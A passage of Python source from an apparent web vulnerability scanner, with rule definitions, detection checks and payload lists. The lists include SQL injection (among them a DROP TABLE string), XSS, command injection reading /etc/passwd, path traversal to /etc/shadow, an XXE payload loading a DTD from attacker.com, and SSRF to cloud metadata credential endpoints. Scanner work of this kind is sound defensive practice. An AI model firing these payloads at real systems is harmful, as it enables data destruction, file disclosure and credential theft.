            },
            'Cross-site Request Forgery (CSRF)': {
                'patterns': [],
                'severity': 'Medium',
                'confidence': 'Low',
                'cwe': 'CWE-352',
                'owasp': 'A01:2021',
                'remediation': 'Implement anti-CSRF tokens.',
                'payloads': []
            },
            'Insecure Direct Object References (IDOR)': {
                'patterns': [],
                'severity': 'Medium',
                'confidence': 'Low',
                'cwe': 'CWE-639',
                'owasp': 'A01:2021',
                'remediation': 'Implement proper authorization checks.',
                'payloads': []
            },
            'Broken Authentication': {
                'patterns': [],
                'severity': 'High',
                'confidence': 'Medium',
                'cwe': 'CWE-287',
                'owasp': 'A07:2021',
                'remediation': 'Implement proper authentication mechanisms.',
                'payloads': []
            },
            'Sensitive Data Exposure': {
                'patterns': [
                    r"(?i)(credit\s*card|ssn|social\s*security|password|secret)",
                    r"\b\d{16}\b",  # Credit card numbers
                    r"\b\d{3}-\d{2}-\d{4}\b",  # SSN
                ],
                'severity': 'High',
                'confidence': 'Medium',
                'cwe': 'CWE-319',
                'owasp': 'A02:2021',
                'remediation': 'Encrypt sensitive data.',
                'payloads': []
            }
        }

    def _load_signatures(self) -> Dict:
        """Load vulnerability signatures"""
        return {
            'SQLi': self._check_sql_injection,
            'XSS': self._check_xss,
            'RCE': self._check_command_injection,
            'LFI': self._check_path_traversal,
            'XXE': self._check_xxe,
            'SSRF': self._check_ssrf,
            'IDOR': self._check_idor,
            'CSRF': self._check_csrf,
            'CORS': self._check_cors,
            'Headers': self._check_security_headers,
            'InfoDisclosure': self._check_information_disclosure,
            'Auth': self._check_authentication,
            'Session': self._check_session_management
        }

    def _load_payloads(self) -> Dict:
        """Load testing payloads"""
        return {
            'SQLi': self._load_sqli_payloads(),
            'XSS': self._load_xss_payloads(),
            'RCE': self._load_rce_payloads(),
            'LFI': self._load_lfi_payloads(),
            'XXE': self._load_xxe_payloads(),
            'SSRF': self._load_ssrf_payloads()
        }

    def _load_cwe_db(self) -> Dict:
        """Load CWE database"""
        # Simplified CWE database
        return {
            'CWE-79': {
                'name': 'Improper Neutralization of Input During Web Page Generation (\'Cross-site Scripting\')',
                'description': 'The software does not neutralize or incorrectly neutralizes user-controllable input before it is placed in output that is used as a web page that is served to other users.',
                'likelihood': 'High',
                'impact': 'Medium',
                'mitigation': 'Use appropriate encoding on all user-supplied data.'
            },
            'CWE-89': {
                'name': 'Improper Neutralization of Special Elements used in an SQL Command (\'SQL Injection\')',
                'description': 'The software constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.',
                'likelihood': 'High',
                'impact': 'High',
                'mitigation': 'Use parameterized queries or stored procedures.'
            },
            # Add more CWEs as needed
        }

    def _load_sqli_payloads(self) -> List[str]:
        """Load SQL injection payloads"""
        return [
            "'",
            "''",
            "`",
            "\"",
            "\"\"",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "' OR '1'='1' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' AND 1=0 UNION SELECT @@version--",
            "'; DROP TABLE users--",
            "' OR 'a'='a",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            "admin'--",
            "admin' #",
            "' OR '1'='1' LIMIT 1--",
            "' OR 1=1 ORDER BY 1--",
            "' OR 1=1 ORDER BY 1,2--",
            "' OR 1=1 ORDER BY 1,2,3--",
            "' OR SLEEP(5)--",
            "' OR BENCHMARK(1000000,MD5('A'))--",
            "' OR 1=1 WAITFOR DELAY '0:0:5'--"
        ]

    def _load_xss_payloads(self) -> List[str]:
        """Load XSS payloads"""
        return [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "javascript:alert(1)",
            "javascrip&#x74;:alert(1)",
            "javascrip&#x74;:alert(1)",
            "onload=alert(1)",
            "onerror=alert(1)",
            "onmouseover=alert(1)",
            "onfocus=alert(1)",
            "onblur=alert(1)",
            "onclick=alert(1)",
            "ondblclick=alert(1)",
            "onkeydown=alert(1)",
            "onkeypress=alert(1)",
            "onkeyup=alert(1)",
            "onmousedown=alert(1)",
            "onmousemove=alert(1)",
            "onmouseout=alert(1)",
            "onmouseover=alert(1)",
            "onmouseup=alert(1)",
            "onreset=alert(1)",
            "onselect=alert(1)",
            "onsubmit=alert(1)",
            "onunload=alert(1)",
            "<img src=\"x\" onerror=\"alert(1)\">",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
            "<img src=x oneonerrorrror=alert(1)>",
            "<img src=x:alert(alt) onerror=eval(src)>",
            "<img src=1 href=1 onerror=\"javascript:alert(1)\"></img>",
            "<audio src=x onerror=alert(1)>",
            "<video src=x onerror=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
            "<form><button formaction=javascript:alert(1)>",
            "<isindex type=image src=1 onerror=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<details open ontoggle=alert(1)>"
        ]

    def _load_rce_payloads(self) -> List[str]:
        """Load command injection payloads"""
        return [
            "; ls",
            "| ls",
            "`ls`",
            "$(ls)",
            "|| ls",
            "&& ls",
            "; id",
            "| id",
            "`id`",
            "$(id)",
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "; uname -a",
            "| uname -a",
            "`uname -a`",
            "$(uname -a)",
            "; ping -c 1 127.0.0.1",
            "| ping -c 1 127.0.0.1",
            "`ping -c 1 127.0.0.1`",
            "$(ping -c 1 127.0.0.1)",
            "; sleep 5",
            "| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; echo test",
            "| echo test",
            "`echo test`",
            "$(echo test)",
            "| dir",
            "; dir",
            "`dir`",
            "$(dir)",
            "| type C:\\windows\\win.ini",
            "; type C:\\windows\\win.ini",
            "`type C:\\windows\\win.ini`",
            "$(type C:\\windows\\win.ini)"
        ]

    def _load_lfi_payloads(self) -> List[str]:
        """Load path traversal payloads"""
        return [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "/etc/passwd",
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "/etc/passwd%00.png",
            "/etc/passwd%00.gif",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/group",
            "/etc/motd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\windows\\win.ini",
            "C:\\boot.ini",
            "../../../windows/win.ini",
            "../../../../windows/win.ini",
            "../../../../../windows/win.ini",
            "....//....//etc/passwd",
            "..//..//..//etc/passwd",
            "..///..///..///etc/passwd",
            "/var/www/html/index.php",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/var/log/auth.log",
            "/var/log/syslog",
            "http://localhost:8080/../../etc/passwd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "zip://path/to/archive.zip#file.txt",
            "phar://path/to/archive.phar/file.txt"
        ]

    def _load_xxe_payloads(self) -> List[str]:
        """Load XXE payloads"""
        return [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&test;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;%init;%trick;]><root></root>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
        ]

    def _load_ssrf_payloads(self) -> List[str]:
        """Load SSRF payloads"""
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/latest/user-data",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
            "http://localhost:8080",
            "http://127.0.0.1:8080",
            "http://localhost:3306",
            "http://127.0.0.1:3306",
            "http://localhost:6379",
            "http://127.0.0.1:6379",
            "http://localhost:9200",
            "http://127.0.0.1:9200",
            "file:///etc/passwd",
            "gopher://localhost:80/_GET%20/HTTP/1.0",
            "dict://localhost:11211/stat",
            "ftp://localhost:21",
            "ldap://localhost",
            "tftp://localhost"
        ]

    def scan_request(self, request_scan: Dict, response: Dict, project_id: str = None) -> List[Dict]:
        """Scan a single request/response pair"""
        findings = []
        normalized_findings = []

        # Pattern-based detection
        findings.extend(self._pattern_based_scan(request_scan, response))

        # Signature-based detection
        findings.extend(self._signature_based_scan(request_scan, response))

        # Behavioral analysis
        findings.extend(self._behavioral_analysis(request_scan, response))

        # Security headers check
        findings.extend(self._check_security_headers(request_scan,response))

        # Information disclosure check
        findings.extend(self._check_information_disclosure(request_scan, response))

        # Authentication checks
        findings.extend(self._check_authentication(request_scan, response))

        # Session management checks
        findings.extend(self._check_session_management(request_scan, response))

        # Add project ID to findings
        for finding in findings:
            normalized_findings.append(
                normalize_finding(
                    finding,
                    request_scan=request_scan,
                    response=response,
                    project_id=project_id
                )
            )

        return normalized_findings

    def _pattern_based_scan(self, request_pattern: Dict, response: Dict) -> List[Dict]:
        """Pattern-based vulnerability detection"""
        findings = []

        # Combine request and response for scanning
        combined_text = self._combine_request_response(request_pattern, response)

        for vuln_type, rule in self.scan_rules.items():
            if 'patterns' not in rule or not rule['patterns']:
                continue

            for pattern in rule['patterns']:
                if re.search(pattern, combined_text, re.IGNORECASE | re.DOTALL):
                    finding = {
                        'issue_type': vuln_type,
                        'severity': rule['severity'],
                        'confidence': rule['confidence'],
                        'description': f"Pattern match for {vuln_type}",
                        'detail': f"Matched pattern: {pattern}",
                        'remediation': rule['remediation'],
                        'evidence': f"Found pattern in request/response",
                        'cwe_id': rule.get('cwe', ''),
                        'owasp_category': rule.get('owasp', ''),
                        'cvss_score': self._calculate_cvss_score(rule['severity']),
                        'location': 'Request/Response',
                        'parameter': 'N/A',
                        'request': request_pattern.get('raw', b'').decode('latin-1', errors='ignore')[:1000],
                        'response': response.get('raw', b'').decode('latin-1', errors='ignore')[:1000]
                    }
                    findings.append(finding)
                    break  # Only report once per vulnerability type

        return findings

    def _signature_based_scan(self, request_sign: Dict, response: Dict) -> List[Dict]:
        """Signature-based vulnerability detection"""
        findings = []

        for sig_name, sig_func in self.signatures.items():
            sig_findings = sig_func(request_sign, response)
            if sig_findings:
                findings.extend(sig_findings)

        return findings

    def _behavioral_analysis(self, request_behaviour: Dict, response: Dict) -> List[Dict]:
        """Behavioral analysis for vulnerabilities"""
        findings = []

        # Check for error messages
        error_patterns = {
            'SQL Injection': [
                r"SQL syntax.*MySQL",
                r"PostgreSQL.*ERROR",
                r"Microsoft OLE DB Provider",
                r"ODBC Driver",
                r"java\.sql\.SQLException",
                r"System\.Data\.SqlClient\.SqlException",
                r"Unclosed quotation mark",
                r"Incorrect syntax near"
            ],
            'Information Disclosure': [
                r"error.*at.*\.java",
                r"Stack trace:",
                r"Exception in thread",
                r"Warning:.*on line",
                r"Fatal error:",
                r"Parse error:",
                r"Notice:",
                r"Deprecated:"
            ]
        }

        response_text = response.get('parsed_body', b'').decode('utf-8', errors='ignore')

        for vuln_type, patterns in error_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    finding = {
                        'issue_type': vuln_type,
                        'severity': 'Medium' if vuln_type == 'Information Disclosure' else 'High',
                        'confidence': 'High',
                        'description': f'{vuln_type} error message revealed',
                        'detail': f'Error message found: {pattern}',
                        'remediation': 'Configure proper error handling',
                        'evidence': f'Response contains error message: {pattern}',
                        'cwe_id': 'CWE-209' if vuln_type == 'Information Disclosure' else 'CWE-89',
                        'owasp_category': 'A01:2021' if vuln_type == 'Information Disclosure' else 'A03:2021',
                        'cvss_score': 5.3 if vuln_type == 'Information Disclosure' else 7.5,
                        'location': 'Response',
                        'parameter': 'N/A'
                    }
                    findings.append(finding)
                    break

        # Check for sensitive data in response
        sensitive_patterns = [
            (r'(?i)(api[_-]?key|access[_-]?token|auth[_-]?token)\s*[=:]\s*[\'"]([^\'"]+)[\'"]', 'API Key Exposure'),
            (r'(?i)(password|passwd|pwd)\s*[=:]\s*[\'"]([^\'"]+)[\'"]', 'Password Exposure'),
            (r'(?i)(secret|private[_-]?key)\s*[=:]\s*[\'"]([^\'"]+)[\'"]', 'Secret Exposure'),
            (r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b', 'Email Address Exposure'),
            (r'\b\d{16}\b', 'Credit Card Number Exposure'),
            (r'\b\d{3}-\d{2}-\d{4}\b', 'SSN Exposure')
        ]

        for pattern, issue_type in sensitive_patterns:
            matches = re.findall(pattern, response_text)
            if matches:
                finding = {
                    'issue_type': issue_type,
                    'severity': 'High',
                    'confidence': 'High',
                    'description': f'Sensitive information exposed: {issue_type}',
                    'detail': f'Found {len(matches)} instances of sensitive data',
                    'remediation': 'Remove sensitive data from responses',
                    'evidence': f'Sensitive data found: {matches[0][:50]}...',
                    'cwe_id': 'CWE-200',
                    'owasp_category': 'A01:2021',
                    'cvss_score': 7.5,
                    'location': 'Response',
                    'parameter': 'N/A'
                }
                findings.append(finding)
                break

        return findings

    def _check_sql_injection(self, request_sql: Dict, response: Dict) -> List[Dict]:
        """Check for SQL injection vulnerabilities"""
        findings = []

        # Get parameters from request
        params = request_sql.get('parameters', {})

        for param_name, param_value in params.items():
            if not param_value:
                continue

            # Check for SQLi patterns in parameter values
            for pattern in self.scan_rules['SQL Injection']['patterns']:
                if re.search(pattern, str(param_value), re.IGNORECASE):
                    finding = {
                        'issue_type': 'SQL Injection',
                        'severity': 'High',
                        'confidence': 'Medium',
                        'description': f'Potential SQL injection in parameter: {param_name}',
                        'detail': f'Parameter value matches SQL injection pattern',
                        'remediation': 'Use parameterized queries',
                        'evidence': f'Parameter "{param_name}" value: {param_value[:100]}',
                        'cwe_id': 'CWE-89',
                        'owasp_category': 'A03:2021',
                        'cvss_score': 8.5,
                        'location': 'Parameter',
                        'parameter': param_name
                    }
                    findings.append(finding)
                    break

        return findings

    def _check_xss(self, request_xss: Dict, response: Dict) -> List[Dict]:
        """Check for XSS vulnerabilities"""
        findings = []

        # Get parameters from request
        params = request_xss.get('parameters', {})

        # Check if parameters are reflected in response
        response_text = response.get('parsed_body', b'').decode('utf-8', errors='ignore')

        for param_name, param_value in params.items():
            if not param_value:
                continue

            # Check if parameter value is reflected in response
            if str(param_value) in response_text:
                # Check if reflection is in a dangerous context
                dangerous_contexts = [
                    f'>{param_value}<',
                    f'"{param_value}"',
                    f"'{param_value}'",
                    f'({param_value})',
                    f'javascript:{param_value}',
                ]

                for context in dangerous_contexts:
                    if context in response_text:
                        finding = {
                            'issue_type': 'Cross-site Scripting (XSS)',
                            'severity': 'Medium',
                            'confidence': 'Medium',
                            'description': f'Reflected XSS in parameter: {param_name}',
                            'detail': f'User input reflected without proper encoding',
                            'remediation': 'Implement output encoding',
                            'evidence': f'Parameter "{param_name}" reflected in dangerous context',
                            'cwe_id': 'CWE-79',
                            'owasp_category': 'A03:2021',
                            'cvss_score': 6.5,
                            'location': 'Parameter',
                            'parameter': param_name
                        }
                        findings.append(finding)
                        break

        return findings

    def _check_command_injection(self, request_command: Dict, response: Dict) -> List[Dict]:
        """Check for command injection vulnerabilities"""
        findings = []

        params = request_command.get('parameters', {})

        for param_name, param_value in params.items():
            if not param_value:
                continue

            # Check for command injection patterns
            for pattern in self.scan_rules['Command Injection']['patterns']:
                if re.search(pattern, str(param_value), re.IGNORECASE):
                    finding = {
                        'issue_type': 'Command Injection',
                        'severity': 'Critical',
                        'confidence': 'Medium',
                        'description': f'Potential command injection in parameter: {param_name}',
                        'detail': f'Parameter value matches command injection pattern',
                        'remediation': 'Validate and sanitize user input',
                        'evidence': f'Parameter "{param_name}" value: {param_value[:100]}',
                        'cwe_id': 'CWE-78',
                        'owasp_category': 'A03:2021',
                        'cvss_score': 9.5,
                        'location': 'Parameter',
                        'parameter': param_name
                    }
                    findings.append(finding)
                    break

        return findings

    def _check_path_traversal(self, request_path: Dict, response: Dict) -> List[Dict]:
        """Check for path traversal vulnerabilities"""
        findings = []

        params = request_path.get('parameters', {})

        for param_name, param_value in params.items():
            if not param_value:
                continue

            # Check for path traversal patterns
            for pattern in self.scan_rules['Path Traversal']['patterns']:
                if re.search(pattern, str(param_value), re.IGNORECASE):
                    finding = {
                        'issue_type': 'Path Traversal',
                        'severity': 'High',
                        'confidence': 'Medium',
                        'description': f'Potential path traversal in parameter: {param_name}',
                        'detail': f'Parameter value matches path traversal pattern',
                        'remediation': 'Validate file paths',
                        'evidence': f'Parameter "{param_name}" value: {param_value[:100]}',
                        'cwe_id': 'CWE-22',
                        'owasp_category': 'A01:2021',
                        'cvss_score': 8.0,
                        'location': 'Parameter',
                        'parameter': param_name
                    }
                    findings.append(finding)
                    break

        return findings

    def _check_xxe(self, request_xxe: Dict, response: Dict) -> List[Dict]:
        """Check for XXE vulnerabilities"""
        findings = []

        # Check if request contains XML
        content_type = request_xxe.get('content_type', '')
        body = request_xxe.get('body', b'')

        if 'xml' in content_type.lower() or b'<?xml' in body or b'<!DOCTYPE' in body:
            # Check for XXE patterns
            for pattern in self.scan_rules['XML External Entity (XXE)']['patterns']:
                if re.search(pattern, body.decode('latin-1', errors='ignore'), re.IGNORECASE):
                    finding = {
                        'issue_type': 'XML External Entity (XXE)',
                        'severity': 'High',
                        'confidence': 'Medium',
                        'description': 'Potential XXE vulnerability',
                        'detail': 'XML request contains potential XXE payload',
                        'remediation': 'Disable external entity processing',
                        'evidence': 'XML request contains XXE indicators',
                        'cwe_id': 'CWE-611',
                        'owasp_category': 'A05:2021',
                        'cvss_score': 8.5,
                        'location': 'Request Body',
                        'parameter': 'N/A'
                    }
                    findings.append(finding)
                    break

        return findings

    def _check_ssrf(self, request_ssrf: Dict, response: Dict) -> List[Dict]:
        """Check for SSRF vulnerabilities"""
        findings = []

        params = request_ssrf.get('parameters', {})

        for param_name, param_value in params.items():
            if not param_value:
                continue

            # Check for SSRF patterns
            for pattern in self.scan_rules['Server-Side Request Forgery (SSRF)']['patterns']:
                if re.search(pattern, str(param_value), re.IGNORECASE):
                    finding = {
                        'issue_type': 'Server-Side Request Forgery (SSRF)',
                        'severity': 'High',
                        'confidence': 'Medium',
                        'description': f'Potential SSRF in parameter: {param_name}',
                        'detail': f'Parameter value matches SSRF pattern',
                        'remediation': 'Validate and sanitize URL inputs',
                        'evidence': f'Parameter "{param_name}" value: {param_value[:100]}',
                        'cwe_id': 'CWE-918',
                        'owasp_category': 'A10:2021',
                        'cvss_score': 8.0,
                        'location': 'Parameter',
                        'parameter': param_name
                    }
                    findings.append(finding)
                    break

        return findings

    def _check_idor(self, request_idor: Dict, response: Dict) -> List[Dict]:
        """Check for IDOR vulnerabilities"""
        findings = []

        # Look for numeric IDs in parameters
        params = request_idor.get('parameters', {})

        id_patterns = [
            r'id', r'user', r'account', r'uid', r'userid',
            r'accountid', r'customer', r'customerid'
        ]

        for param_name, param_value in params.items():
            param_lower = param_name.lower()

            # Check if parameter name suggests it's an ID
            is_id_param = any(pattern in param_lower for pattern in id_patterns)

            if is_id_param and str(param_value).isdigit():
                # Check if response contains sensitive information
                response_text = response.get('parsed_body', b'').decode('utf-8', errors='ignore')
                sensitive_indicators = [
                    'password', 'email', 'address', 'phone',
                    'credit', 'card', 'ssn', 'secret'
                ]

                if any(indicator in response_text.lower() for indicator in sensitive_indicators):
                    finding = {
                        'issue_type': 'Insecure Direct Object References (IDOR)',
                        'severity': 'Medium',
                        'confidence': 'Low',
                        'description': f'Potential IDOR vulnerability with parameter: {param_name}',
                        'detail': 'Numeric ID parameter may allow access to other users\' data',
                        'remediation': 'Implement proper authorization checks',
                        'evidence': f'Parameter "{param_name}" is numeric and response contains sensitive data',
                        'cwe_id': 'CWE-639',
                        'owasp_category': 'A01:2021',
                        'cvss_score': 5.5,
                        'location': 'Parameter',
                        'parameter': param_name
                    }
                    findings.append(finding)

        return findings

    def _check_csrf(self, request_csrf: Dict, response: Dict) -> List[Dict]:
        """Check for CSRF vulnerabilities"""
        findings = []

        # Check if state-changing request lacks CSRF protection
        state_changing_methods = ['POST', 'PUT', 'DELETE', 'PATCH']

        if request_csrf.get('method') in state_changing_methods:
            # Check for CSRF tokens
            headers = dict(request_csrf.get('headers', []))
            params = request_csrf.get('parameters', {})

            csrf_indicators = ['csrf', 'xsrf', 'token', 'nonce']

            has_csrf_token = False

            # Check headers
            for header_name in headers:
                if any(indicator in header_name.lower() for indicator in csrf_indicators):
                    has_csrf_token = True
                    break

            # Check parameters
            for param_name in params:
                if any(indicator in param_name.lower() for indicator in csrf_indicators):
                    has_csrf_token = True
                    break

            if not has_csrf_token:
                finding = {
                    'issue_type': 'Cross-site Request Forgery (CSRF)',
                    'severity': 'Medium',
                    'confidence': 'Low',
                    'description': 'Potential CSRF vulnerability',
                    'detail': 'State-changing request lacks CSRF protection',
                    'remediation': 'Implement anti-CSRF tokens',
                    'evidence': 'No CSRF token found in request',
                    'cwe_id': 'CWE-352',
                    'owasp_category': 'A01:2021',
                    'cvss_score': 6.0,
                    'location': 'Request',
                    'parameter': 'N/A'
                }
                findings.append(finding)

        return findings

    def _check_cors(self, request_cors: Dict, response: Dict) -> List[Dict]:
        """Check for CORS misconfigurations"""
        findings = []

        # Get CORS headers from response
        headers = dict(response.get('headers', []))

        acao = headers.get('Access-Control-Allow-Origin')
        acac = headers.get('Access-Control-Allow-Credentials')

        if acao and acac:
            if acao.strip() == '*' and acac.strip().lower() == 'true':
                finding = {
                    'issue_type': 'CORS Misconfiguration',
                    'severity': 'Medium',
                    'confidence': 'High',
                    'description': 'Insecure CORS configuration',
                    'detail': 'CORS allows credentials with wildcard origin',
                    'remediation': 'Configure proper CORS headers',
                    'evidence': f'Access-Control-Allow-Origin: {acao}, Access-Control-Allow-Credentials: {acac}',
                    'cwe_id': 'CWE-942',
                    'owasp_category': 'A07:2021',
                    'cvss_score': 5.0,
                    'location': 'Response Headers',
                    'parameter': 'N/A'
                }
                findings.append(finding)

        return findings

    def _check_security_headers(self,request_headers: Dict, response: Dict) -> List[Dict]:
        """Check for missing security headers"""
        findings = []

        headers = dict(response.get('headers', []))

        security_headers = {
            'Content-Security-Policy': {
                'description': 'Missing Content Security Policy header',
                'severity': 'Medium',
                'remediation': 'Implement Content Security Policy'
            },
            'X-Frame-Options': {
                'description': 'Missing X-Frame-Options header',
                'severity': 'Low',
                'remediation': 'Set X-Frame-Options to DENY or SAMEORIGIN'
            },
            'X-Content-Type-Options': {
                'description': 'Missing X-Content-Type-Options header',
                'severity': 'Low',
                'remediation': 'Set X-Content-Type-Options to nosniff'
            },
            'Strict-Transport-Security': {
                'description': 'Missing HSTS header',
                'severity': 'Medium',
                'remediation': 'Implement HSTS with appropriate max-age'
            },
            'Referrer-Policy': {
                'description': 'Missing Referrer-Policy header',
                'severity': 'Low',
                'remediation': 'Set Referrer-Policy to strict-origin-when-cross-origin'
            },
            'Permissions-Policy': {
                'description': 'Missing Permissions-Policy header',
                'severity': 'Low',
                'remediation': 'Implement Permissions-Policy'
            }
        }

        for header, info in security_headers.items():
            if header not in headers:
                finding = {
                    'issue_type': 'Security Headers Missing',
                    'severity': info['severity'],
                    'confidence': 'High',
                    'description': info['description'],
                    'detail': f'Missing security header: {header}',
                    'remediation': info['remediation'],
                    'evidence': f'Header {header} is not present in response',
                    'cwe_id': 'CWE-693',
                    'owasp_category': 'A05:2021',
                    'cvss_score': 3.0 if info['severity'] == 'Low' else 5.0,
                    'location': 'Response Headers',
                    'parameter': 'N/A'
                }
                findings.append(finding)

        return findings

    def _check_information_disclosure(self, request_info: Dict, response: Dict) -> List[Dict]:
        """Check for information disclosure"""
        findings = []

        headers = dict(response.get('headers', []))

        # Check for sensitive server headers
        sensitive_headers = [
            'Server', 'X-Powered-By', 'X-AspNet-Version',
            'X-AspNetMvc-Version', 'X-Backend-Server'
        ]

        for header in sensitive_headers:
            if header in headers:
                finding = {
                    'issue_type': 'Information Disclosure',
                    'severity': 'Low',
                    'confidence': 'High',
                    'description': f'Sensitive header exposed: {header}',
                    'detail': f'Header reveals server information: {headers[header]}',
                    'remediation': 'Remove or obfuscate server information headers',
                    'evidence': f'{header}: {headers[header]}',
                    'cwe_id': 'CWE-200',
                    'owasp_category': 'A01:2021',
                    'cvss_score': 3.0,
                    'location': 'Response Headers',
                    'parameter': 'N/A'
                }
                findings.append(finding)

        return findings

    def _check_authentication(self, request_auth: Dict, response: Dict) -> List[Dict]:
        """Check for authentication issues"""
        findings = []

        # Check for basic authentication over HTTP
        if request_auth.get('scheme') == 'http':
            auth_header = request_auth.get('authorization', '')
            if auth_header and auth_header.startswith('Basic '):
                finding = {
                    'issue_type': 'Broken Authentication',
                    'severity': 'High',
                    'confidence': 'High',
                    'description': 'Basic authentication over HTTP',
                    'detail': 'Credentials transmitted in cleartext',
                    'remediation': 'Use HTTPS for authentication',
                    'evidence': 'Basic authentication header found in HTTP request',
                    'cwe_id': 'CWE-319',
                    'owasp_category': 'A02:2021',
                    'cvss_score': 7.5,
                    'location': 'Request',
                    'parameter': 'N/A'
                }
                findings.append(finding)

        return findings

    def _check_session_management(self, request_session: Dict, response: Dict) -> List[Dict]:
        """Check for session management issues"""
        findings = []

        # Check for insecure session cookies
        cookies = request_session.get('cookies', {})

        for cookie_name, cookie_value in cookies.items():
            if 'session' in cookie_name.lower() or 'auth' in cookie_name.lower():
                # Check response for Set-Cookie without secure flag
                set_cookies = response.get('set_cookie', [])

                for set_cookie in set_cookies:
                    if cookie_name in set_cookie:
                        if 'Secure' not in set_cookie and request_session.get('scheme') == 'https':
                            finding = {
                                'issue_type': 'Insecure Session Management',
                                'severity': 'Medium',
                                'confidence': 'High',
                                'description': 'Session cookie without Secure flag',
                                'detail': 'Session cookie can be transmitted over HTTP',
                                'remediation': 'Set Secure flag on session cookies',
                                'evidence': f'Cookie {cookie_name} missing Secure flag',
                                'cwe_id': 'CWE-614',
                                'owasp_category': 'A07:2021',
                                'cvss_score': 5.0,
                                'location': 'Response Headers',
                                'parameter': 'N/A'
                            }
                            findings.append(finding)

                        if 'HttpOnly' not in set_cookie:
                            finding = {
                                'issue_type': 'Insecure Session Management',
                                'severity': 'Low',
                                'confidence': 'High',
                                'description': 'Session cookie without HttpOnly flag',
                                'detail': 'Session cookie accessible to JavaScript',
                                'remediation': 'Set HttpOnly flag on session cookies',
                                'evidence': f'Cookie {cookie_name} missing HttpOnly flag',
                                'cwe_id': 'CWE-1004',
                                'owasp_category': 'A07:2021',
                                'cvss_score': 3.0,
                                'location': 'Response Headers',
                                'parameter': 'N/A'
                            }
                            findings.append(finding)

        return findings

    def _combine_request_response(self, request_combined: Dict, response: Dict) -> str:
        """Combine request and response for scanning"""
        combined = []

        # Add request
        combined.append(f"{request_combined.get('method', '')} {request_combined.get('full_path', '')}")

        for key, value in request_combined.get('headers', []):
            combined.append(f"{key}: {value}")

        if request_combined.get('body'):
            try:
                combined.append(request_combined['body'].decode('utf-8', errors='ignore'))
            except:
                pass

        # Add response
        combined.append(f"HTTP {response.get('status_code', '')} {response.get('status_text', '')}")

        for key, value in response.get('headers', []):
            combined.append(f"{key}: {value}")

        if response.get('body'):
            try:
                combined.append(response['body'].decode('utf-8', errors='ignore'))
            except:
                pass

        return '\n'.join(combined)

    def _calculate_cvss_score(self, severity: str) -> float:
        """Calculate CVSS score based on severity"""
        scores = {
            'Critical': 9.0,
            'High': 7.5,
            'Medium': 5.0,
            'Low': 3.0,
            'Info': 0.0
        }
        return scores.get(severity, 5.0)

    def _ensure_master_project(self):
        """Ensure master project exists"""
        try:
            conn = db_manager.get_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT OR IGNORE INTO projects (id, name, created, modified, status) VALUES ('master', 'Master Project', datetime('now'), datetime('now'), 'active')")
            conn.commit()
        except:
            pass

    def start_scan(self, target_url: str, scan_type: str = 'full', project_id: str = None) -> str:
        """Start a new scan"""
        scan_id = str(uuid.uuid4())
        project_id = f"scan-{project_id}"

        self._create_project_if_needed(project_id, target_url)
